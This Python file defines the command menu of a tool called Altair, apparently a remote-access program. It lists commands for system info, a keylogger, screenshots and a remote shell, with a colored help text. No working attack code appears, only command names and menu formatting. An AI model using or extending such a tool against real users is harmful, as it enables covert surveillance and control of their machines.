from util import Console

class AltairCommandList:
   INFO = "get-info"
   EXIT = "exit"
   KEY_LOGGER = "k-lgr"
   SS = "get-screen_s"
   INCLUDE_SHELL = "i-shell"
   HELP = "help"
   HELPER = f"""{Console.CYAN}\t    ╰──/{Console.DEFAULT}{INFO}{Console.CYAN}        [{Console.GREEN}INFORMATION{Console.CYAN}]
       ╰──/{Console.DEFAULT}{EXIT}{Console.CYAN}    \t\t[{Console.GREEN}EXIT{Console.CYAN}]
       ╰──/{Console.DEFAULT}{KEY_LOGGER}{Console.CYAN}   \t\t[{Console.GREEN}KEYLOGGER{Console.CYAN}]
       ╰──/{Console.DEFAULT}{SS}{Console.CYAN}\t[{Console.GREEN}SCREEN-SHOT{Console.CYAN}]
       ╰──/{Console.DEFAULT}{INCLUDE_SHELL}{Console.CYAN}      \t[{Console.GREEN}INCLUDE-SHELL{Console.CYAN}]
   """.expandtabs(4)